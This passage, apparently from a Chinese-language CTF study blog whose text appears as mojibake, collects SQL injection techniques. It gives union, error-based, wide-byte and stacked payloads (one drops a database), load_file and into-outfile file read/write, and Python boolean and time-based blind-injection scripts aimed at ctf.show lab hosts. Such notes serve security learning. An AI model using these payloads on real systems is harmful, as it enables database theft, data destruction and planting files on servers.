æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥â€¦â€¦</p><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><p><strong>1.åˆ¤æ–­æ˜¾ç¤ºä½</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=SELECT first name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select 1,2,3#;</span><br></pre></td></tr></table></figure><p><strong>2.çˆ†æ•°æ®åº“çš„åå­—</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;1&#x27; union select 1,user(),database()--+â€˜ï¼›</span><br></pre></td></tr></table></figure><p><strong>3.çˆ†æ•°æ®åº“ä¸­çš„è¡¨</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&#x27;;</span><br></pre></td></tr></table></figure><p><strong>4.çˆ†è¡¨ä¸­çš„å­—æ®µ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= &#x27;-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+&#x27;ï¼Œ</span><br></pre></td></tr></table></figure><p><strong>5.çˆ†ç›¸åº”å­—æ®µçš„æ‰€æœ‰æ•°æ®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(user,password) from users--+&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ç›²æ³¨è„šæœ¬"><a href="#ç›²æ³¨è„šæœ¬" class="headerlink" title="ç›²æ³¨è„šæœ¬"></a>ç›²æ³¨è„šæœ¬</h3><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">if __name__ == &#x27;__main__&#x27; :</span><br><span class="line">    url = &#x27;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            data=&#123;</span><br><span class="line">                &quot;uname&quot;:f&quot;admin&#x27; and &#123;payload&#125;#&quot;,</span><br><span class="line">                &quot;passwd&quot;:12346</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=data)</span><br><span class="line">            if &#x27;flag.jpg&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">if __name__ == &#x27;__main__&#x27; :</span><br><span class="line">    url = &#x27;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            stime=time.time()</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if time.time()-stime&lt;2:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><h3 id="æ³¨å…¥ç±»å‹-1"><a href="#æ³¨å…¥ç±»å‹-1" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h3><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><p>å…¶äº§ç”ŸåŸå› æ˜¯ï¼šæœåŠ¡å™¨ç«¯è™½ç„¶å¯¹ç”¨æˆ·çš„ç›´æ¥è¾“å…¥åšäº†ä¸€äº›è¿‡æ»¤æˆ–è€…å°†ä¸€äº›å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯å¯¹äºå·²ç»å­˜å…¥æ•°æ®åº“çš„ä¿¡æ¯æ˜¯å®Œå…¨ä¿¡ä»»çš„ï¼Œå³ï¼šä¸æ ¡éªŒæ•°æ®åº“ä¿¡æ¯æ˜¯å¦åˆæ³•</p><p>åˆ©ç”¨åœºæ™¯ä¸»è¦æœ‰ï¼šé¶æœºé‡ŒåŒæ—¶å­˜åœ¨æ³¨å†Œå’Œç™»å½•é¡µé¢ï¼Œä¸”éœ€è¦è·å¾—adminå¯†ç </p><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><p>å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œ</p><p>é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªgbkç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ªutf-8ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚ã€‚å› æ­¤å½“æˆ‘ä»¬è¾“å…¥â€™æ—¶ï¼Œåœ¨phpä»£ç ä¸­å¦‚æœæœ‰è¿‡æ»¤çš„è¯ä¼šåˆ©ç”¨è½¬ä¹‰å­—ç¬¦\è¿›è¡Œè½¬ä¹‰ï¼Œè€Œåˆ©ç”¨urlencodeè¡¨ç¤ºçš„è¯ï¼Œå°±ä¸º%5c%27ï¼Œæˆ‘ä»¬è‹¥æƒ³è¦å°†%5cå»æ‰ï¼Œåˆ™è‹¥æ­¤æ—¶mysqlç”¨çš„æ˜¯GBKç¼–ç ï¼Œåˆ™å¯ä»¥åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªç¼–ç å¦‚**%df**ï¼Œä½¿å¾—ç³»ç»Ÿè®¤å®š%df%5cè¡¨ç¤ºç€ä¸€ä¸ªæ±‰å­—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df&#x27;users %df&#x27;--+</span><br></pre></td></tr></table></figure><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><p>ä½¿ç”¨å‰æï¼šå †å æ³¨å…¥ä½¿ç”¨çš„æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œä¼šå—åˆ°APIä»¥åŠæ•°æ®åº“å¼•æ“ï¼Œæˆ–è€…æ˜¯æƒé™çš„é™åˆ¶ã€‚åªæœ‰å½“è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡SQLè¯­å¥çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ã€‚ä¾‹å¦‚ <strong>mysqli_multi_query()</strong> å‡½æ•°å°±æ”¯æŒå¤šæ¡SQLè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œè€Œ mysqli_query() å‡½æ•°å°±ä¸æ”¯æŒã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¤§å¤šæ•°éƒ½ä½¿ç”¨çš„æ˜¯ <strong>mysqli_query()</strong> å‡½æ•°ï¼Œæ‰€ä»¥èƒ½ä½¿ç”¨å †å æ³¨å…¥çš„è¯´æ˜è¯¥ç½‘ç«™åšçš„å¾ˆä¸æˆåŠŸï¼Œå› ä¸ºå †å æ³¨å…¥çš„çˆ†ç ´æ•ˆæœå¤ªå¥½äº†ã€‚ä¸€èˆ¬PHPæ­å»ºçš„ç½‘ç«™ä¸ºäº†é˜²æ­¢SQLæ³¨å…¥éƒ½ä¼šä½¿ç”¨ mysqli_query() å‡½æ•°ã€‚</p><p>åˆ©ç”¨æ–¹å¼:åœ¨æˆ‘ä»¬è¾“å…¥çš„è¯­å¥åé¢åŠ ä¸Šåˆ†å·è¡¨ç¤ºè¯¥è¯­å¥ç»“æŸï¼Œä¹‹åå†è¾“å…¥å¦ä¸€æ¡è¯­å¥å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚å¯ä»¥å…ˆå†™ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œä¹‹ååŠ åˆ†å·è¡¨ç¤ºæŸ¥è¯¢ç»“æŸï¼Œå†åœ¨åˆ†å·åè¾“å…¥åˆ é™¤è¯­å¥ã€‚è¿™æ ·å°±å«å †å æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=show database();drop database &lt;æ•°æ®åº“å&gt;;</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶è¯»å–å†™å…¥æ³¨å…¥"><a href="#æ–‡ä»¶è¯»å–å†™å…¥æ³¨å…¥" class="headerlink" title="æ–‡ä»¶è¯»å–å†™å…¥æ³¨å…¥"></a>æ–‡ä»¶è¯»å–å†™å…¥æ³¨å…¥</h4><h5 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,load_file(&#x27;æ–‡ä»¶è·¯å¾„&#x27;)</span><br><span class="line">union select 1,2,load_file(&#x27;D:/test.txt&#x27;)</span><br><span class="line">?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)</span><br><span class="line"> ï¼ˆ%20æ˜¯æ¢è¡Œï¼Œ%27æ˜¯å¼•å·ï¼Œæœ‰è·¯å¾„æ—¶ï¼Œé˜²æ­¢è½¬ä¹‰å¯ä»¥å°†\æ”¹ä¸º\\æˆ–è€…/ï¼‰</span><br></pre></td></tr></table></figure><h5 id="æ–‡ä»¶å†™å…¥"><a href="#æ–‡ä»¶å†™å…¥" class="headerlink" title="æ–‡ä»¶å†™å…¥"></a>æ–‡ä»¶å†™å…¥</h5><p><strong><code>union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;æ–‡ä»¶è·¯å¾„&#39; --+</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;E:\\phpStudy\\WWW\\sqli\\Less-7\\1.php&#x27; --+</span><br><span class="line">æ­¤æ—¶å°±å°† phpinfo() çš„å†…å®¹å†™å…¥ E:\phpStudy\WWW\sqli\Less-7 è·¯å¾„ä¸‹å¹¶åˆ›å»ºä¸€ä¸ª1.phpæ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><p><strong>updatexmlï¼ˆï¼‰å‡½æ•°</strong></p><ul><li>updatexmlï¼ˆï¼‰æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸åŒçš„xmlæ ‡è®°åŒ¹é…å’Œæ›¿æ¢xmlå—çš„å‡½æ•°ã€‚</li><li>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</li><li>è¯­æ³•ï¼š updatexmlï¼ˆXML_documentï¼ŒXPath_stringï¼Œnew_valueï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°ï¼šæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šä»£è¡¨è·¯å¾„ï¼ŒXpathæ ¼å¼çš„å­—ç¬¦ä¸²ä¾‹å¦‚&#x2F;&#x2F;titleã€@langã€‘ ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šstringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li><li>updatexmlä½¿ç”¨æ—¶ï¼Œå½“xpath_stringæ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯ï¼ˆxpath syntaxï¼‰</li><li>ä¾‹å¦‚ï¼š select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); ç”±äº0x7eæ˜¯~ï¼Œä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤æŠ¥å‡ºxpathè¯­æ³•é”™è¯¯ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">çˆ†å‡ºæ•°æ®åº“</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7er),1)#</span><br><span class="line"></span><br><span class="line">çˆ†å½“å‰æ•°æ®åº“è¡¨ä¿¡æ¯</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br><span class="line"></span><br><span class="line">çˆ†userè¡¨å­—æ®µä¿¡æ¯</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br><span class="line"></span><br><span class="line">çˆ†æ•°æ®åº“å†…å®¹ã€ã€</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</span><br></pre></td></tr></table></figure><p>extractvalue()å‡½æ•°å…¶å®ä¸updatexml()å‡½æ•°å¤§åŒå°å¼‚ï¼Œéƒ½æ˜¯é€šè¿‡xpathè·¯å¾„é”™è¯¯æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">çˆ†å‡ºæ•°æ®åº“</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</span><br><span class="line"></span><br><span class="line">çˆ†å½“å‰æ•°æ®åº“è¡¨ä¿¡æ¯</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</span><br><span class="line"></span><br><span class="line">çˆ†userè¡¨å­—æ®µä¿¡æ¯</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) #</span><br><span class="line"></span><br><span class="line">çˆ†æ•°æ®åº“å†…å®¹ã€ã€</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</span><br></pre></td></tr></table></figure><h3 id="handlerå‘½ä»¤æ³¨å…¥"><a href="#handlerå‘½ä»¤æ³¨å…¥" class="headerlink" title="handlerå‘½ä»¤æ³¨å…¥"></a>handlerå‘½ä»¤æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,â€¦) [ WHERE where_condition ] [LIMIT â€¦ ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT â€¦ ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT â€¦ ]</span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><p>sqlæ³¨å…¥ä¸€èˆ¬éƒ½ä¼šç”¨åˆ°information_schemaè¿™ä¸ªåº“ï¼ˆmysqlè‡ªå¸¦çš„åº“ï¼‰ï¼Œæ‰€ä»¥banæ‰è¿™ä¸ªè¡¨æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é˜²å¾¡æ‰‹æ®µï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥æ¥ç»•è¿‡ã€‚</p><h4 id="information-schemaåº“ä¸­çš„è¡¨ï¼š"><a href="#information-schemaåº“ä¸­çš„è¡¨ï¼š" class="headerlink" title="information_schemaåº“ä¸­çš„è¡¨ï¼š"></a>information_schemaåº“ä¸­çš„è¡¨ï¼š</h4><ul><li><p>SCHEMATAè¡¨ï¼šæä¾›äº†å½“å‰MySQLå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯s<code>how databases</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p></li><li><p>TABLESè¡¨ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯<code>show tables from schemaname</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p></li><li><p>COLUMNSè¡¨ï¼šæä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯<code>show columns from schemaname.tablename</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p></li><li><p>STATISTICSè¡¨ï¼šæä¾›äº†å…³äºè¡¨ç´¢å¼•çš„ä¿¡æ¯ã€‚æ˜¯<code>show index from schemaname.tablename</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p></li><li><p>USER_PRIVILEGESï¼ˆç”¨æˆ·æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºå…¨ç¨‹æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.useræˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p></li><li><p>SCHEMA_PRIVILEGESï¼ˆæ–¹æ¡ˆæƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºæ–¹æ¡ˆï¼ˆæ•°æ®åº“ï¼‰æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æ¥è‡ªmysql.dbæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p></li><li><p>TABLE_PRIVILEGESï¼ˆè¡¨æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºè¡¨æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.tables_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p></li><li><p>COLUMN_PRIVILEGESï¼ˆåˆ—æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºåˆ—æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.columns_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p></li><li><p>CHARACTER_SETSï¼ˆå­—ç¬¦é›†ï¼‰è¡¨ï¼šæä¾›äº†mysqlå®ä¾‹å¯ç”¨å­—ç¬¦é›†çš„ä¿¡æ¯ã€‚æ˜¯<code>SHOW CHARACTER SET</code>ç»“æœé›†å–ä¹‹æ­¤è¡¨ã€‚</p></li><li><p>COLLATIONSè¡¨ï¼šæä¾›äº†å…³äºå„å­—ç¬¦é›†çš„å¯¹ç…§ä¿¡æ¯ã€‚</p></li><li><p>COLLATION_CHARACTER_SET_APPLICABILITYè¡¨ï¼šæŒ‡æ˜äº†å¯ç”¨äºæ ¡å¯¹çš„å­—ç¬¦é›†ã€‚è¿™äº›åˆ—ç­‰æ•ˆäº<code>SHOW COLLATION</code>çš„å‰ä¸¤ä¸ªæ˜¾ç¤ºå­—æ®µã€‚</p></li><li><p>TABLE_CONSTRAINTSè¡¨ï¼šæè¿°äº†å­˜åœ¨çº¦æŸçš„è¡¨ã€‚ä»¥åŠè¡¨çš„çº¦æŸç±»å‹ã€‚</p></li><li><p>KEY_COLUMN_USAGEè¡¨ï¼šæè¿°äº†å…·æœ‰çº¦æŸçš„é”®åˆ—ã€‚</p></li><li><p>ROUTINESè¡¨ï¼šæä¾›äº†å…³äºå­˜å‚¨å­ç¨‹åºï¼ˆå­˜å‚¨ç¨‹åºå’Œå‡½æ•°ï¼‰çš„ä¿¡æ¯ã€‚æ­¤æ—¶ï¼ŒROUTINESè¡¨ä¸åŒ…å«è‡ªå®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰ã€‚åä¸ºâ€œmysql.proc nameâ€çš„åˆ—æŒ‡æ˜äº†å¯¹åº”äºINFORMATION_SCHEMA.ROUTINESè¡¨çš„mysql.procè¡¨åˆ—ã€‚</p></li><li><p>VIEWSè¡¨ï¼šç»™å‡ºäº†å…³äºæ•°æ®åº“ä¸­çš„è§†å›¾çš„ä¿¡æ¯ã€‚éœ€è¦æœ‰show viewsæƒé™ï¼Œå¦åˆ™æ— æ³•æŸ¥çœ‹è§†å›¾ä¿¡æ¯ã€‚</p></li><li><p>TRIGGERSè¡¨ï¼šæä¾›äº†å…³äºè§¦å‘ç¨‹åºçš„ä¿¡æ¯ã€‚å¿…é¡»æœ‰superæƒé™æ‰èƒ½æŸ¥çœ‹è¯¥è¡¨</p><p>åœ¨mysql 5.5.8ä¹‹åå¼€å§‹ä½¿ç”¨InnoDbä½œä¸ºé»˜è®¤å¼•æ“ï¼Œ<strong>mysql 5.6</strong>çš„InnoDbå¢åŠ äº†<strong>innodb_index_stats</strong>å’Œ<strong>innodb_table_stats</strong>ä¸¤å¼ è¡¨</p><p>è¿™ä¸¤å¼ è¡¨è®°å½•äº†æ•°æ®åº“å’Œè¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰åˆ—å</p><p>MySQL 5.7å¼€å§‹å¢åŠ äº†sysåº“ï¼Œè¿™ä¸ªåº“å¯ä»¥ç”¨äºå¿«é€Ÿäº†è§£ç³»ç»Ÿå…ƒæ•°æ®ä¿¡æ¯ã€‚sysåº“é€šè¿‡è§†å›¾çš„å½¢å¼æŠŠinformation_schemaå’Œperformance_schemaç»“åˆèµ·æ¥ï¼ŒæŸ¥è¯¢ä»¤äººå®¹æ˜“ç†è§£çš„æ•°æ®ã€‚</p><p>sysåº“çš„ä¸¤ç§å½¢å¼ï¼š</p><p>1.æ­£å¸¸çš„ï¼šschema_table_statistics_with_bufferï¼ˆé€‚åˆäººé˜…è¯»ï¼‰</p><p>2.ä»¥x$å¼€å¤´ï¼šx$schema_table_statistics_with_bufferï¼ˆé€‚åˆå·¥å…·é‡‡é›†æ•°æ®ï¼‰</p><p>ä¸Šè¿°çš„innodbå¼•æ“çš„è¡¨å’Œsysåº“çš„è¡¨éƒ½æ— æ³•æŸ¥åˆ°åˆ—åï¼Œè¿™é‡Œå°±éœ€è¦ä½¿ç”¨æ— åˆ—åæ³¨å…¥ã€‚</p><h3 id="ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡ŒSQLæ³¨å…¥"><a href="#ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡ŒSQLæ³¨å…¥" class="headerlink" title="ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡ŒSQLæ³¨å…¥"></a>ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡ŒSQLæ³¨å…¥</h3><p>åˆ©ç”¨unionè”åˆæŸ¥è¯¢æ„é€ åˆ—å</p><figure class="highlight sql"><table><tr><td 